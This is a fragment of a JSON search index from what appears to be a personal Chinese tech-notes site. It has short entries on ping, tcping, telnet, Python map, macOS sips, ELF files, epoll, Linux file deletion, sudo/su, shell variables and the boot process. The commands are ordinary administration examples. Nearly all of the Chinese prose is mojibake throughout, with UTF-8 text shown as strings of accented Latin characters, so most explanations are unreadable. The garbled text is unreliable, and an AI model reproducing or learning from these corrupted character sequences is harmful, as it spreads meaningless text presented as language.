LAN/WAN å£ IPï¼Œå¯ä»¥é€‰æ‹©å¼ºåˆ¶åº”ç”¨ï¼Œä¿è¯ä¿®æ”¹è‚¯å®šç”Ÿæ•ˆã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Istoreos-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Istoreos-index.html"},{"title":"ping","text":"ä¸»è¦é€è¿‡ icmp å°åŒ… æ¢ç´¢ç½‘ç»œ. å±äºç½‘ç»œå±‚çš„ICMPåè®®ï¼Œåªèƒ½æ£€æŸ¥ IP çš„è¿é€šæ€§æˆ–ç½‘ç»œè¿æ¥é€Ÿåº¦ï¼Œ æ— æ³•æ£€æµ‹IPçš„ç«¯å£çŠ¶æ€ã€‚ å¯ä»¥æµ‹è¯•ä¸»æœºä¹‹é—´ç½‘ç»œçš„è¿é€šæ€§ -c æ•°å€¼ è¡¨ç¤ºæ‰§è¡Œpingçš„æ¬¡æ•° -n ä¸è¿›è¡Œipä¸ä¸»æœºåçš„åæŸ¥ï¼Œç›´æ¥ç”¨ipè¾“å‡ºï¼ˆé€Ÿåº¦è¾ƒå¿«ï¼‰ -s æ•°å€¼ å‘å‡ºå»çš„ icmp å°åŒ…å¤§å°ï¼Œé¢„è®¾ä¸º56bytes -t æ•°å€¼ TTLçš„æ•°å€¼ï¼Œé¢„è®¾æ˜¯255ï¼Œæ¯ç»è¿‡ä¸€ä¸ªèŠ‚ç‚¹å°±å‡ä¸€ -W æ•°å€¼ ç­‰å¾…å“åº”å¯¹æ–¹ä¸»æœºçš„ç§’æ•° -M [do|dont] ä¸»è¦åœ¨ä¾¦æµ‹ç½‘ç»œçš„MTUæ•°å€¼å¤§å° do ä»£è¡¨ä¼ é€ä¸€ä¸ª DFï¼ˆDont Fragmentï¼‰æ——æ ‡ï¼Œè®©å°åŒ…ä¸èƒ½é‡æ–°æ‹†åŒ…ä¸æ‰“åŒ… dont ä»£è¡¨ä¸è¦ä¼ é€ DFæ ‡å¿—ï¼Œè¡¨ç¤ºå°åŒ…å¯ä»¥åœ¨å…¶ä»–ä¸»æœºå°åŒ…ã€æ‰“åŒ… è‹¥ä¸å­˜åœ¨: apt-get install iputils-ping","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-flat.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-flat.html"},{"title":"tcping","text":"ä¸ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/ping å’Œ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/telnet éƒ½ä¸åŒ, æ˜¯ä¸€æ¬¾è·¨å¹³å°çš„åŸºäºGoçš„, tcpé“¾æ¥æ£€æŸ¥å·¥å…·. ä½¿ç”¨ä¼ è¾“å±‚åè®®ï¼Œå¯ä»¥æ£€æµ‹IPç«¯å£çŠ¶æ€å’ŒæŸ¥çœ‹ping å€¼ï¼Œ å³ä½¿æºåœ°å€ç¦ ping ä¹Ÿå¯ä»¥é€šè¿‡ tcping æ¥ç›‘æ§æœåŠ¡å™¨ç½‘ç»œçŠ¶æ€ã€‚ Windowsä¸‹è½½: https://elifulkerson.com/projects/tcping.php MacOSå®‰è£…: brew install tcping æ³¨è§£ çœ‹äº†ä¸‹, è²Œä¼¼æœ€å¼€å§‹åªæœ‰winç‰ˆ, ä¸çŸ¥é“å•¥å†™çš„, ç„¶åæ˜¯åé¢æ‰æœ‰äººç”¨Goæ ¹æ®è¿™ä¸ªå†™çš„å…¶ä»–å¹³å°çš„ç‰ˆæœ¬, ç›®å‰æ’åæœ€é«˜çš„ä¸¤ä¸ª: https://github.com/cloverstd/tcping # è¿™ä¸ªæ›´æ–°å‹¤ç‚¹ https://github.com/pouriyajamshidi/tcping MacOSä¸‹çœ‹äº†ä¸‹, ç”¨çš„æ˜¯æ”¶è—é‡ä¸é«˜çš„: brew info tcping ==> tcping: stable 2.1.0 (bottled), HEAD TCP connect to the given IP/port combo https://github.com/mkirchner/tcping /usr/local/Cellar/tcping/2.1.0 (5 files, 39.4KB) * Poured from bottle using the formulae.brew.sh API on 2024-03-04 at 10:07:05 From: https://github.com/Homebrew/homebrew-core/blob/HEAD/Formula/t/tcping.rb License: MIT ç”¨æ³•: tcping [-q] [-f <4|6>] [-t timeout_sec] [-u timeout_usec] <host> <port> ä¸¾ä¾‹: ### é»˜è®¤ç«¯å£ä¸º80 tcping google.com ### å¸¦ä¸Š80ç«¯å£ tcping google.com 80 ### å¸¦ä¸Š443ç«¯å£ tcping google.com 443 ### å¤šä¸ªç«¯å£ tcping google.com 80 443 ### è¿ç»­çš„ç«¯å£ tcping google.com 80-85 ### å¤šä¸ªè¿ç»­çš„ç«¯å£ tcping google.com 80-83 443-445 ### IPV6 åœ°å€ tcping [::1]","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcping.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-tcping.html"},{"title":"telnet","text":"ç™»å½•è¿œç¨‹ä¸»æœºå’Œç®¡ç†(ä¹Ÿå¯ä»¥ç®€å•æµ‹è¯•ipç«¯å£æ˜¯å¦è¿é€š). å±äºåº”ç”¨å±‚çš„åè®®ï¼Œå¯ç”¨äºè¿œç¨‹ç™»å½•ï¼Œä¹Ÿå¯ç”¨äºæ£€æµ‹IPçš„ç«¯å£çŠ¶æ€ æ³¨è§£ ä¸€èˆ¬ç™»é™†æˆåŠŸå°±ä¸ç›®æ ‡ä¸»æœºç«¯å£å»ºç«‹é“¾æ¥äº†, ä¹Ÿå¯ä»¥ç”¨æ¥ä½œä¸ºä¸€ä¸ªç®€å•çš„clientæµ‹è¯•server è¯­æ³•: telnet [host|ip [port]]","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-telnet.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-telnet.html"},{"title":"map","text":"map(fun, iter) ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå‡½æ•°ï¼Œ ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¿­ä»£å™¨ï¼Œè¡¨ç¤ºå¯¹æ¯ä¸€ä¸ªè¿­ä»£å™¨çš„å…ƒç´ åšfunæ“ä½œ å½“iterä¸ºlistæ—¶ï¼Œ map(fun, iter) ç­‰ä»·äº [fun(x) for x in iter]","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-map.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-map.html"},{"title":"å›¾æ ‡åˆ¶ä½œ","text":"ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/Mac/MacæŒ‡ä»¤/sips ä¾‹, æœ‰ä¸€ä¸ª1024*1024çš„png: pic.png: mkdir tmp.iconset # å‘½ä»¤æ ¼å¼ï¼šsips -z æ–°å›¾ç‰‡å®½åº¦ æ–°å›¾ç‰‡é«˜åº¦ åŸå›¾ç‰‡å --out ä¸´æ—¶.iconset/æ–°å›¾ç‰‡å®Œæ•´å sips -z 16 16 pic.png --out tmp.iconset/icon_16x16.png sips -z 32 32 pic.png --out tmp.iconset/icon_16x16@2x.png sips -z 32 32 pic.png --out tmp.iconset/icon_32x32.png sips -z 64 64 pic.png --out tmp.iconset/icon_32x32@2x.png sips -z 128 128 pic.png --out tmp.iconset/icon_128x128.png sips -z 256 256 pic.png --out tmp.iconset/icon_128x128@2x.png sips -z 256 256 pic.png --out tmp.iconset/icon_256x256.png sips -z 512 512 pic.png --out tmp.iconset/icon_256x256@2x.png sips -z 512 512 pic.png --out tmp.iconset/icon_512x512.png sips -z 1024 1024 pic.png --out tmp.iconset/icon_512x512@2x.png è¿˜å¯å‚è€ƒ: https://blog.csdn.net/ypf1024/article/details/114011755","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-Icon-making.html","loc":"/yq-doc-source-docs-operating-system-Mac-Icon-making.html"},{"title":"sips","text":"sips, å›¾åƒå¤„ç†è„šæœ¬(scriptable image processing system), æ”¯æŒè¿›è¡Œå›¾ç‰‡çš„æ ¼å¼è½¬æ¢, ä»¥åŠå›¾ç‰‡çš„è£å‰ªæ—‹è½¬ç­‰å„ç§å¸¸ç”¨æ“ä½œ. æ˜¯MacOSè‡ªå¸¦çš„å›¾ç‰‡å¤„ç†å‘½ä»¤, åŠŸèƒ½å¼ºå¤§. è´¨é‡é«˜,pdfè½¬pngä¼šä¸¢å¤±èƒŒæ™¯,ä¸”ä¸èƒ½å¤„ç†icoæ–‡ä»¶ æ³¨è§£ æœ‰ä¸ªæ›´ç®€å•çš„åªèƒ½è½¬æ¢ç±»å‹çš„ /docs/æ“ä½œç³»ç»Ÿ/Mac/MacæŒ‡ä»¤/convert , ä¸è¿‡æ¸…æ™°åº¦ä¸é«˜. å›¾åƒå¤„ç†è„šæœ¬(scriptable image processing system): This tool is used to query or modify raster image files and ColorSync ICC profiles. Its functionality can also be used through the \"Image Events\" AppleScript suite. å‘½ä»¤æ ¼å¼ç®€æ´ç‰ˆ(ä¸‹é¢å¤ªé•¿): sips -z æ–°å›¾ç‰‡å®½åº¦ æ–°å›¾ç‰‡é«˜åº¦ åŸå›¾ç‰‡å --out ä¸´æ—¶.iconset/æ–°å›¾ç‰‡å®Œæ•´å Usages: sips [image-functions] imagefile ... sips [profile-functions] profile ... Profile query functions: -g, --getProperty key -X, --extractTag tag tagFile --verify -1, --oneLine Image query functions: -g, --getProperty key -x, --extractProfile profile -1, --oneLine Profile modification functions: -s, --setProperty key value -d, --deleteProperty key --deleteTag tag --copyTag srcTag dstTag --loadTag tag tagFile --repair -o, --out file-or-directory Image modification functions:: -s, --setProperty key value -d, --deleteProperty key -e, --embedProfile profile -E, --embedProfileIfNone profile -m, --matchTo profile -M, --matchToWithIntent profile intent --deleteColorManagementProperties -r, --rotate degreesCW -f, --flip horizontal|vertical -c, --cropToHeightWidth pixelsH pixelsW --cropOffset offsetY offsetH -p, --padToHeightWidth pixelsH pixelsW --padColor hexcolor -z, --resampleHeightWidth pixelsH pixelsW è£å‰ªå›¾ç‰‡, æŒ‡å®šå®½åº¦ã€é«˜åº¦ --resampleWidth pixelsW è£å‰ªå›¾ç‰‡, æŒ‡å®šå®½åº¦ --resampleHeight pixelsH è£å‰ªå›¾ç‰‡, æŒ‡å®šé«˜åº¦ -Z, --resampleHeightWidthMax pixelsWH è£å‰ªå›¾ç‰‡, æŒ‡å®šå®½åº¦(é«˜åº¦è‡ªé€‚åº”) -i, --addIcon --optimizeColorForSharing -o, --out file-or-directory -j, --js file Other functions: --debug Enable debugging output -h, --help Show help -H, --helpProperties æ‰€æœ‰é”®å€¼å‚æ•°(Show help for properties) --man Generate man pages -v, --version Show the version --formats åˆ—å‡ºæ”¯æŒçš„æ ¼å¼(Show the read/write formats) ç”¨ä¾‹ å›¾ç‰‡æ ¼å¼è½¬æ¢ pdf->png: sips -s format png old.pdf -o new.png pdf->jpg: sips -s format jpeg old.pdf -o new.jpg jpg->gif: sips -s format gif old.jpg -o new.gif æ³¨è§£ icoæ ¼å¼(å›¾æ ‡)ä¸èƒ½é€šè¿‡sipså®ç°, åªèƒ½é€šè¿‡imagemagickæ¥æ“ä½œ. ä¿®æ”¹å›¾ç‰‡ä¸ºæŒ‡å®šåƒç´  ä¿®æ”¹å›¾ç‰‡ä¸º20000åƒç´ å®½, é«˜åº¦ä¸ºè‡ªé€‚åº”(Zå¤§å†™): sips -Z 20000 a.jpg ä¿®æ”¹å›¾ç‰‡ä¸º200*200åƒç´ : sips -z 200 200 a.jpg æ—‹è½¬/ç¿»è½¬å›¾ç‰‡ é¡ºæ—¶é’ˆæ—‹è½¬å›¾ç‰‡180Â°: sips -r 180 a.jpg æ°´å¹³/å‚ç›´ç¿»è½¬å›¾ç‰‡: sips -f horizontal a.jpg sips -f vertical a.jpg","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-SIPS.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-SIPS.html"},{"title":"elfæ–‡ä»¶","text":"å‚è€ƒ: https://zhuanlan.zhihu.com/p/59590848 https://zhuanlan.zhihu.com/p/112754720 Linux ä¸Šå¯æ‰§è¡Œç¨‹åºéµå¾ªçš„æ˜¯ ELFï¼ˆExecutable and Linking Formatï¼‰æ ¼å¼, æ˜¯ä¸€ä¸ªå®šä¹‰äº†ç›®æ ‡æ–‡ä»¶å†…éƒ¨ä¿¡æ¯å¦‚ä½•ç»„æˆå’Œç»„ç»‡çš„æ–‡ä»¶æ ¼å¼ã€‚ å†…æ ¸ä¼šæ ¹æ®è¿™äº›ä¿¡æ¯åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå†…æ ¸æ ¹æ®è¿™äº›ä¿¡æ¯å¯ä»¥çŸ¥é“ä»æ–‡ä»¶å“ªé‡Œè·å–ä»£ç ï¼Œ ä»å“ªé‡Œè·å–åˆå§‹åŒ–æ•°æ®ï¼Œåœ¨å“ªé‡Œåº”è¯¥åŠ è½½å…±äº«åº“ï¼Œç­‰ä¿¡æ¯ã€‚ åˆ†ç±» .oç›®æ ‡æ–‡ä»¶ ç”±: gcc -c test.c å¾—åˆ°çš„test.oå°±æ˜¯ç›®æ ‡æ–‡ä»¶ï¼Œç›®æ ‡æ–‡ä»¶é€šè¿‡é“¾æ¥å¯ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚ é™æ€åº“å…¶å®ä¹Ÿç®—ç›®æ ‡æ–‡ä»¶ï¼Œé™æ€åº“æ˜¯é€šè¿‡arå‘½ä»¤å°†ç›®æ ‡æ‰“åŒ…ä¸º.aæ–‡ä»¶ã€‚ å¦‚: ar crv libtest.a test.o å¯æ‰§è¡Œæ–‡ä»¶ å¯ç”±: gcc -o test test.c ç”Ÿæˆ .soå…±äº«åº“ å¯ç”±ç”Ÿæˆ: gcc test.c -fPIC -shared -o libtest.so å¯ä»¥é€šè¿‡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/readelf æ¥åŒºåˆ†ä¸Šé¢ä¸‰ç§ç±»å‹çš„ELFæ–‡ä»¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-ELF-file.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-ELF-file.html"},{"title":"IOæ¨¡å‹","text":"epoll å¥½å¤„ epollæ˜¯å•çº¿ç¨‹, åŸºäºå›è°ƒ; å‡å°‘å¤šçº¿ç¨‹åˆ‡æ¢çš„å¼€é”€ epoll_create å‡½æ•°: int epoll_create(int size); å…³äºæ›´å¤šä¿¡æ¯, å¯ä»¥é€šè¿‡æŸ¥çœ‹: man epoll_create æ³¨è§£ æ–‡ä»¶æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œ Linuxå†…æ ¸ä¸ºé«˜æ•ˆç®¡ç†å·²è¢«æ‰“å¼€çš„\"æ–‡ä»¶\"æ‰€åˆ›å»ºçš„ç´¢å¼•ï¼Œç”¨è¯¥ç´¢å¼•å¯ä»¥æ‰¾åˆ°æ–‡ä»¶ epoll_ctl å¯¹äºæŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦epfdå¼•ç”¨çš„epollå®ä¾‹, ç›‘å¬ç›¸å…³äº‹ä»¶event å‡½æ•°: int epoll_ctl (int epfd, int op, int fd, struct epoll_event *event); op EPOLL_CTL_ADDï¼š æ³¨å†Œæ–°çš„fdåˆ°epfdä¸­ï¼Œå¹¶å…³è”äº‹ä»¶eventï¼› EPOLL_CTL_MODï¼šä¿®æ”¹å·²ç»æ³¨å†Œçš„fdçš„ç›‘å¬äº‹ä»¶ï¼› EPOLL_CTL_DELï¼šä»epfdä¸­ç§»é™¤fdï¼Œå¹¶ä¸”å¿½ç•¥æ‰ç»‘å®šçš„eventï¼Œè¿™æ—¶eventå¯ä»¥ä¸ºnull; events æœ‰å¾ˆå¤šå¯é€‰å€¼ï¼Œè¿™é‡Œåªä¸¾ä¾‹æœ€å¸¸è§çš„å‡ ä¸ª EPOLLIN ï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¯è¯»çš„ï¼› EPOLLOUTï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯å¯å†™çš„ï¼› EPOLLERRï¼šè¡¨ç¤ºå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å‘ç”Ÿäº†é”™è¯¯ï¼› æˆåŠŸåˆ™è¿”å›0ï¼Œå¤±è´¥è¿”å›-1 epoll_wait ç­‰å¾… epoll_ctl çš„äº‹ä»¶ å½“socketæ”¶åˆ°æ•°æ®åï¼Œ æ“ä½œç³»çµ±çš„ä¸­æ–­ç¨‹åºè°ƒç”¨å›è°ƒå‡½æ•°ä¼šç»™epollå®ä¾‹çš„ äº‹ä»¶å°±ç·’åˆ—è¡¨rdlisté‡Œæ·»åŠ è¯¥socketå¼•ç”¨ï¼ˆè¿™å—æ˜¯æ“ä½œç³»ç»Ÿå®ç°çš„ï¼‰ï¼Œ å½“ç¨‹åºæ‰§è¡Œåˆ°epoll_wait æ—¶ï¼Œå¦‚æœrdllistå·²ç»å¼•ç”¨äº†socketï¼Œ é‚£ä¹ˆ epoll_wait ç›´æ¥è¿”å›ï¼Œå¦‚æœrdllistä¸ºç©ºï¼Œé˜»å¡è¿›ç¨‹ rdllist å°±ç»ªäº‹ä»¶åˆ—è¡¨ å†åº•å±‚å°±æ˜¯æ“ä½œç³»ç»Ÿçš„ ** ä¸­æ–­** å®ç°","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-IO-model.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-IO-model.html"},{"title":"linuxåˆ é™¤æœºåˆ¶","text":"linuxä¸‹æ–‡ä»¶æ˜¯å¦çœŸå®å­˜åœ¨å¯ä»¥é€šè¿‡ç¡¬è¿æ¥åˆ¤æ–­ åªè¦è¯¥æ–‡ä»¶ç¡¬è¿æ¥æ•°é‡å¤§äºç­‰äº1, é‚£ä¹ˆå®ƒå°±çœŸå®å­˜åœ¨(æ•°é‡å°±æ˜¯æœ‰å¤šå°‘ä»½è€Œå·²) è€Œåˆ é™¤çš„æ—¶å€™, éœ€è¦ä¿è¯ä¸¤ç§é“¾æ¥çš„æ•°é‡éƒ½ä¸º0, æ‰èƒ½çœŸæ­£åˆ é™¤: i_count, è¢«è°ƒç”¨è®¡æ•°(å¯ä»¥ç†è§£ä¸ºå†…å­˜çš„å¼•ç”¨è®¡æ•°å™¨) i_nlink, ç¡¬é“¾æ¥è®¡æ•° ä½¿ç”¨rmåˆ é™¤ä¸€ä¸ªæ–‡ä»¶æ—¶, åªæ˜¯å°†i_nlinkçš„æ•°ç›®å‡1, ä½†æ˜¯è‹¥åœ¨æ­¤ä¹‹å‰å­˜åœ¨è°ƒç”¨ä¸”æœªç»“æŸæ—¶, rmå¯ä»¥æˆåŠŸæ‰§è¡Œ, ä½†æ˜¯å¹¶ä¸ä¼šçœŸæ­£ä»ç£ç›˜åˆ é™¤(å› ä¸ºi_countä¸ä¸º0) å¦‚æœè¦åœ¨è¿™ä¸ªæ—¶å€™æ‰¾å›è¢«åˆ é™¤çš„æ–‡ä»¶, åœä¸‹å…¶ä»–çš„ç£ç›˜å†™å…¥è¿›ç¨‹(é˜²æ­¢å¯¹åº”çš„æ•°æ®åŒºå—è¢«è¦†ç›–), ç„¶åæ‰¾åˆ°å½“å‰è¿™ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶å°±è¡Œ å¯ä»¥ä½¿ç”¨ lsof æˆ–è€…ç›´æ¥å» /procä¸‹æ‰¾å³å¯. å¦‚: lsof | grep deleted æ³¨è§£ æ£€æŸ¥linkçš„åŠæ³•: ls -ihl æ£€æŸ¥i_countçš„åŠæ³•(-uæŒ‡åœ¨æ¯ä¸ªè¿›ç¨‹åæ˜¾ç°æ‰€å±çš„ç”¨æˆ·åï¼Œ-væŒ‡è¯¦ç»†å½¢å¼): fuser -uv [ç»å¯¹è·¯å¾„æ–‡ä»¶å]","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-deletion-mechanism.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-deletion-mechanism.html"},{"title":"sudoä¸suçš„éƒ¨åˆ†è¯´æ˜","text":"su <user>: åˆ‡æ¢åˆ°æŒ‡å®šçš„user, è¾“å‡ºè¿™ä¸ªuserçš„å¯†ç . å¯ä»¥åŠ  - æŒ‡å®šåˆ‡æ¢åˆ°userçš„ç¯å¢ƒ. sudo <cmd>: ä»¥rootçš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤, è¿˜æ˜¯ä½¿ç”¨å½“å‰ç”¨æˆ·çš„ç¯å¢ƒ, å¯ä»¥ä½¿ç”¨ -u æŒ‡å®šå…¶ä»–ç”¨æˆ· sudo su: åˆ‡æ¢åˆ°root, ä¿ç•™æœ€åˆçš„ç”¨æˆ·ç¯å¢ƒ sudo su -: åˆ‡æ¢åˆ°root, åŒæ—¶å­˜åœ¨æœ€åˆçš„ç”¨æˆ·çš„ç¯å¢ƒä¸rootçš„ç”¨æˆ·ç¯å¢ƒ, å¦‚æœå†²çª, ä»¥rootä¸ºå‡†","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Part-of-the-SUDO-and-SU-explanation.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Part-of-the-SUDO-and-SU-explanation.html"},{"title":"æŒ‡ä»¤exportã€envã€setä¸‰è€…çš„åŒºåˆ«","text":"exportã€envã€setä¸‰è€…çš„åŒºåˆ« æ³¨è§£ echo $PATH #è¾“å‡ºå½“å‰ç¯å¢ƒå˜é‡ locale #è®¾ç½®ç³»ç»Ÿè¯­è¨€ç¯å¢ƒ set ç”¨æ¥æ˜¾ç¤ºæœ¬åœ°å˜é‡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/set env ç”¨æ¥æ˜¾ç¤ºç¯å¢ƒå˜é‡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/env export ç”¨æ¥æ˜¾ç¤ºå’Œè®¾ç½®ç¯å¢ƒå˜é‡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/export shellå˜é‡ shellå˜é‡åŒ…æ‹¬ä¸¤ç§å˜é‡ æœ¬shellç§æœ‰çš„å˜é‡ï¼šé€šè¿‡èµ‹å€¼è¯­å¥å®šä¹‰å¥½çš„å˜é‡ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•å®šä¹‰shellå˜é‡: A1=\"1234\" delcare A2=\"2345\" ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ï¼šé€šè¿‡exportè¯­æ³•å¯¼å‡ºçš„shellç§æœ‰å˜é‡ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•å¯¼å‡ºç”¨æˆ·ç¯å¢ƒå˜é‡: A1=\"1234\" export A1 #å…ˆå®šä¹‰å†å¯¼å‡º export A3=\"34\" å¯¼å‡ºæˆçš„ç”¨æˆ·ç¯å¢ƒå˜é‡å¯ä»¥åœ¨æ‰€æœ‰çš„shellä¸­çœ‹åˆ° æ€»ç»“ set æ˜¾ç¤ºå½“å‰shellçš„å®šä¹‰çš„ç§æœ‰å˜é‡ï¼ŒåŒ…æ‹¬å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ï¼ŒæŒ‰å˜é‡åç§°æ’åºï¼› env æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å˜é‡ export æ˜¾ç¤ºå½“å‰å¯¼å‡ºæˆç”¨æˆ·å˜é‡çš„shellå˜é‡ï¼Œå¹¶æ˜¾ç¤ºå˜é‡çš„å±æ€§(æ˜¯å¦åªè¯»)ï¼ŒæŒ‰å˜é‡åç§°æ’åºï¼› declare åŒset ä¸€æ ·ï¼Œæ˜¾ç¤ºå½“å‰shellçš„å®šä¹‰çš„å˜é‡ï¼ŒåŒ…æ‹¬ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚ æ¯ä¸ªshellæœ‰è‡ªå·±ç‰¹æœ‰çš„å˜é‡ï¼ˆsetï¼‰æ˜¾ç¤ºçš„å˜é‡ï¼Œè¿™ä¸ªå’Œç”¨æˆ·å˜é‡æ˜¯ä¸åŒçš„ï¼Œ å½“å‰ç”¨æˆ·å˜é‡å’Œä½ ç”¨ä»€ä¹ˆshellæ— å…³ï¼Œä¸ç®¡ä½ ç”¨ä»€ä¹ˆshelléƒ½åœ¨ï¼Œ æ¯”å¦‚HOME,SHELLç­‰è¿™äº›å˜é‡ï¼Œä½†shellè‡ªå·±çš„å˜é‡ä¸åŒshellæ˜¯ä¸åŒçš„ï¼Œæ¯” å¦‚BASH_ARGCï¼Œ BASHç­‰ï¼Œè¿™äº›å˜é‡åªæœ‰setæ‰ä¼šæ˜¾ç¤ºï¼Œæ˜¯bashç‰¹æœ‰çš„ï¼Œ exportä¸åŠ å‚æ•°çš„æ—¶å€™ï¼Œæ˜¾ç¤ºå“ªäº›å˜é‡è¢«å¯¼å‡ºæˆäº†ç”¨æˆ·å˜é‡ï¼Œ å› ä¸ºä¸€ä¸ªshellè‡ªå·±çš„å˜é‡å¯ä»¥é€šè¿‡export \"å¯¼å‡º\"å˜æˆä¸€ä¸ªç”¨æˆ·å˜é‡ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-difference-between-instructions-Export,-ENV,-SET.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-The-difference-between-instructions-Export,-ENV,-SET.html"},{"title":"Linuxç³»ç»Ÿçš„å¯åŠ¨è¿‡ç¨‹","text":"èœé¸Ÿçš„ Linux ç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ çš„è§£é‡Šè¿˜ä¸é”™ æ¶‰åŠåˆ°æŒ‡ä»¤: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/init /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/shutdown /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/runlevel /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/halt /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/poweroff /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/reboot Linuxç³»ç»Ÿçš„å¯åŠ¨è¿‡ç¨‹å¤§è‡´é˜¶æ®µ: å†…æ ¸çš„å¼•å¯¼(/boot) è¿è¡Œ init ç³»ç»Ÿåˆå§‹åŒ– å»ºç«‹ç»ˆç«¯ ç”¨æˆ·ç™»å½•ç³»ç»Ÿ init å¸¸ç”¨æœºåˆ¶: SysV: init, å¦‚CentOS 5ä¹‹å‰, é…ç½®æ–‡ä»¶ï¼š /etc/inittab Upstart: init, å¦‚CentOS 6, é…ç½®æ–‡ä»¶ï¼š /etc/inittab, /etc/init/*.conf Systemdï¼š systemd, å¦‚CentOS 7,é…ç½®æ–‡ä»¶ï¼š /usr/lib/systemd/systemã€ /etc/systemd/systemã€‚ æ³¨è§£ é…ç½®æ–‡ä»¶å¯è®°å½•é»˜è®¤çš„ è¿è¡Œçº§åˆ« å†…æ ¸å¼•å¯¼ å½“è®¡ç®—æœºæ‰“å¼€ç”µæºåï¼Œé¦–å…ˆæ˜¯BIOSå¼€æœºè‡ªæ£€ï¼ŒæŒ‰ç…§BIOSä¸­è®¾ç½®çš„å¯åŠ¨è®¾å¤‡ï¼ˆé€šå¸¸æ˜¯ç¡¬ç›˜ï¼‰æ¥å¯åŠ¨ã€‚ æ“ä½œç³»ç»Ÿæ¥ç®¡ç¡¬ä»¶ä»¥åï¼Œé¦–å…ˆè¯»å…¥ /boot ç›®å½•ä¸‹çš„å†…æ ¸æ–‡ä»¶ã€‚ è¿è¡Œinit init è¿›ç¨‹æ˜¯ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹çš„èµ·ç‚¹ï¼Œå¯ä»¥æŠŠå®ƒæ¯”æ‹Ÿæˆç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹çš„è€ç¥–å®—ï¼Œæ²¡æœ‰è¿™ä¸ªè¿›ç¨‹ï¼Œç³»ç»Ÿä¸­ä»»ä½•è¿›ç¨‹éƒ½ä¸ä¼šå¯åŠ¨ã€‚ init ç¨‹åºé¦–å…ˆæ˜¯éœ€è¦è¯»å–é…ç½®æ–‡ä»¶ /etc/inittab(æ ¹æ®ä½¿ç”¨æœºåˆ¶çš„ä¸åŒè¯»å–ä¸é€šçš„é…ç½®æ–‡ä»¶, æ¯”å¦‚Ubuntuä½¿ç”¨çš„æ˜¯Upstartæœºåˆ¶, ç›¸å…³é…ç½®æ–‡ä»¶ä¸º/etc/init/rc-sysinit.conf) è¿è¡Œçº§åˆ« è®¸å¤šç¨‹åºéœ€è¦å¼€æœºå¯åŠ¨ã€‚å®ƒä»¬åœ¨Windowså«åš\"æœåŠ¡\"ï¼ˆserviceï¼‰ï¼Œåœ¨Linuxå°±å«åš\"å®ˆæŠ¤è¿›ç¨‹\"ï¼ˆdaemonï¼‰ã€‚ 